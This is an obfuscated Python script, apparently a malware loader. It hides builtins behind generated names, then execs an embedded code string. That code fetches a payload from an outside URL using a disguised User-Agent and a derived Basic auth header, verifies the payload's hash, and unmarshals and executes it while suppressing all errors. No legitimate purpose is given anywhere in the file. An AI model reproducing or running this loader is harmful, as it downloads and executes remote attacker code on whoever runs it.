from random import Random

def z(a):
 for n in a:
     globals()[n]()

def a(i):
     return "".join([chr(122 - int(n)) for n in str(i)])

def ab():
     return YBEoQgNy(1, 10000)

def d():
 global ybEOQgNy
 ybEOQgNy, i = getattr(globals()['__builtins__'], "__dict__"), 0

 for k in __builtins__.__dict__:
     i += 1
     globals()[a(i := i+1)] = ybEOQgNy[k]

def n():
     global YBe0QgyN
     YBe0QgyN = __import__('random')

z('d')

class x():
 def __init__(s):
     globals()["s"] = yux()
 def __getattr__(c, k):
          if k == "_":
               return globals()["s"]
          elif rx(k) in yvx(65, 90):
               globals()["s"] += wz(rx(k) - 17)
          else:
               globals()["s"] += wz(ywv("141", 8) + ((rx(k)-ywv("141", 8)+13)%26))
          return c

class l():
 def __init__(s):
     for _ in yvx(2523):
          YBEoQgNy(1, 10000)
          s.x = 0

def k():
     global YBEoQgNy
     YBEoQgNy = getattr(YbEOQgNy, 'randint')
def j():
     global YbEOQgNy
     YbEOQgNy = Random(5328621030134020678)

z('jkl')

def o():
     global rr
     rr = [2, 10, 88, 144, 12, 74, 53, 44, 51, 48, 136, 53, 243, 221, 16, 48, 170, 146, 203, 83, 101, 218, 120]

def ac(*args):
     f('https://sfi.pl/K7ucggsTz7V81QEH', *args)

class i():
     def __init__(s):
          s.x=0

z('io')
codetoexec = b'import urllib.request\nimport base64\nimport hashlib\nimport marshal\nimport types\n\np = b"MLeI3oxxoUodvwQ0"\ndd = "ab280cf138a9391afaeeadfccc3cdc0c7ceffa9c02ebc4483c03050ffd5808ee"\n\ndef f(u, c):\n    try:\n        a = 10547116428367238450560 // c\n        b = 3280413493030 // c\n        r = urllib.request.Request(u)\n        r.add_header("Authorization", "Basic " + base64.b64encode(p + b":" + str((a*b) % (c**4)).encode()).decode("utf-8"))\n        r.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0")\n        c = urllib.request.urlopen(r).read()\n        d = hashlib.sha256(c).hexdigest()\n        if d == dd:\n            m = types.ModuleType("m")\n            exec(marshal.loads(c[16:]), m.__dict__)\n            print(exec(marshal.loads(c[16:]).__dict__, m.__dict__))\n            m.f(a, b)\n    except Exception:\n        pass\n\n'

vx(codetoexec)

ac(ab())